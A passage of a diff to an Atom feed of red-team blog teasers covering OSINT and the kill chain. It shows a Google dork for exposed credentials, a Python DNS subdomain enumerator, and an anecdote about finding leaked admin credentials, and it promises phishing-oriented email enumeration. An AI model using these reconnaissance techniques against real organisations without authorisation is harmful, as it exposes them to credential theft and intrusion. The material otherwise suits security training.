+        'credentials': f'site:{self.domain} (password OR passwd OR pwd)'
+    }
+    return dorks.get(dork_type, '')</code></pre>
+<p>I once used a script like this to find a database backup file (<code data-path-to-node="20" data-index-in-node="63">.bak</code>) indexed by Google for a major financial institution. It contained admin credentials. I never even had to touch their server.</p>
+<hr>
+<h4 data-path-to-node="22"><strong data-path-to-node="22" data-index-in-node="0">Read the full guide on Medium to get:</strong></h4>
+<ul data-path-to-node="23">
+<li>
+<p data-path-to-node="23,0,0"><strong data-path-to-node="23,0,0" data-index-in-node="0">The "Auto-Dorker" Tool:</strong> A Python script that iterates through 7 different dork types to find exposed secrets automatically.</p>
+</li>
+<li>
+<p data-path-to-node="23,1,0"><strong data-path-to-node="23,1,0" data-index-in-node="0">Email Enumeration Strategy:</strong> How to generate valid employee email lists using pattern detection and LinkedIn mining (crucial for the phishing attacks we do later).</p>
+</li>
+<li>
+<p data-path-to-node="23,2,0"><strong data-path-to-node="23,2,0" data-index-in-node="0">Tech Stack Fingerprinting:</strong> A script that analyzes HTTP headers and cookies to tell you exactly what software the target is running—and what exploits will work.</p>
+</li>
+<li>
+<p data-path-to-node="23,3,0"><strong data-path-to-node="23,3,0" data-index-in-node="0">The "Passive" Guarantee:</strong> How to map an entire organization without sending a single packet to their network, keeping you completely invisible.</p>
+</li>
+</ul>
+<p data-path-to-node="24">We are building the map today so we can attack tomorrow.</p>
+<p data-path-to-node="24"><strong data-path-to-node="25" data-index-in-node="2"><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-2-advanced-osint-external-reconnaissance-finding-what-they-dont-f2de32dfc1b4" target="_blank" rel="noopener noreferrer">READ THE FULL GUIDE ON MEDIUM ➔</a></strong></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>30 Days of Red Team: Day 1 — Mastering the Kill Chain</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-red-team-day-1.html"/>
+        <id>https://maxwell-cross.com/30-days-red-team-day-1.html</id>
+
+        <updated>2025-10-27T09:24:00-04:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    Most security courses lie to you. They teach the Cyber Kill Chain as a linear, orderly process: Recon → Weaponize → Deliver → Win. But real-world Red Teaming is messy. It’s non-linear. You gain access, you hit a wall, you re-recon, you pivot, and you&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h4 data-path-to-node="11"><strong data-path-to-node="11" data-index-in-node="0">Most security courses lie to you.</strong></h4>
+<p data-path-to-node="12">They teach the Cyber Kill Chain as a linear, orderly process: <i data-path-to-node="12" data-index-in-node="62">Recon → Weaponize → Deliver → Win.</i></p>
+<p data-path-to-node="13">But real-world Red Teaming is messy. It’s non-linear. You gain access, you hit a wall, you re-recon, you pivot, and you try again.</p>
+<p data-path-to-node="14">In <strong data-path-to-node="14" data-index-in-node="3">Day 1</strong>, we stop treating the Kill Chain like a vocabulary list and start using it as an operational roadmap. If you don't understand this framework, you aren't a Red Teamer—you're just a script kiddie flailing in the dark.</p>
+<hr>
+<h3 data-path-to-node="16"><strong data-path-to-node="16" data-index-in-node="0">A Glimpse of the Code: Automating Reconnaissance</strong></h3>
+<p data-path-to-node="17">We aren't just covering theory. In Day 1, we start building your personal toolkit immediately.</p>
+<p data-path-to-node="18">Finding subdomains is the first step in mapping an attack surface. Why? Because <code data-path-to-node="18" data-index-in-node="80">dev.target.com</code> usually has weaker security than <code data-path-to-node="18" data-index-in-node="128">www.target.com</code>.</p>
+<p data-path-to-node="19">Here is a snippet of the custom <strong data-path-to-node="19" data-index-in-node="32">DNS Enumerator</strong> we build in the full article:</p>
+<pre class="language-python"><code>def enumerate_subdomains(domain, wordlist):
+    """
+    Enumerate subdomains using DNS queries
+    """
+    found_subdomains = []
+    
+    with open(wordlist, 'r') as f:
+        subdomains = f.read().splitlines()
+    
+    for subdomain in subdomains:
+        test_domain = f"{subdomain}.{domain}"
+        try:
+            answers = dns.resolver.resolve(test_domain, 'A')
+            for rdata in answers:
+                print(f"[+] Found: {test_domain} -&gt; {rdata}")
+                found_subdomains.append(test_domain)
+        except dns.resolver.NXDOMAIN:
+            pass  # Subdomain doesn't exist
+        except Exception as e:
+            pass  # Other DNS errors
+    
+    return found_subdomains</code></pre>
+<p>This simple logic allows us to find the hidden doors into an organization's network. But finding them is only Step 1.</p>
+<hr>
+<h4 data-path-to-node="23"><strong data-path-to-node="23" data-index-in-node="0">Read the full guide on Medium to get:</strong></h4>
+<ul data-path-to-node="24">
+<li>
+<p data-path-to-node="24,0,0"><strong data-path-to-node="24,0,0" data-index-in-node="0">The Complete Toolset:</strong> Get the full source code for the DNS Enumerator <i data-path-to-node="24,0,0" data-index-in-node="70">and</i> a Web Service Fingerprinter that grabs headers and SSL certs.</p>
+</li>
+<li>
+<p data-path-to-node="24,1,0"><strong data-path-to-node="24,1,0" data-index-in-node="0">The 30-Day Roadmap:</strong> A complete breakdown of the series, from Reconnaissance (Days 1–7) to Domain Dominance (Days 22–28).</p>
+</li>
+<li>
+<p data-path-to-node="24,2,0"><strong data-path-to-node="24,2,0" data-index-in-node="0">A Real-World Case Study:</strong> How I used simple reconnaissance to find critical vulnerabilities in a mid-sized tech company’s Jenkins and GitLab instances—without ever firing an exploit.</p>
+</li>
+<li>
+<p data-path-to-node="24,3,0"><strong data-path-to-node="24,3,0" data-index-in-node="0">The "Dirty" Truth:</strong> Why the real Kill Chain loops back on itself and how to survive the chaos of a live engagement.</p>
+</li>
+</ul>
+<p data-path-to-node="25">The theory ends here. Today, we start building the framework you’ll use to break into the network.</p>
+<p data-path-to-node="25"><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-1-understanding-the-kill-chain-your-roadmap-to-domain-admin-9e496bbf91dd" target="_blank" rel="noopener noreferrer">START THE JOURNEY ON MEDIUM ➔</a></p>
+            ]]>
+        </content>
+    </entry>
 </feed>
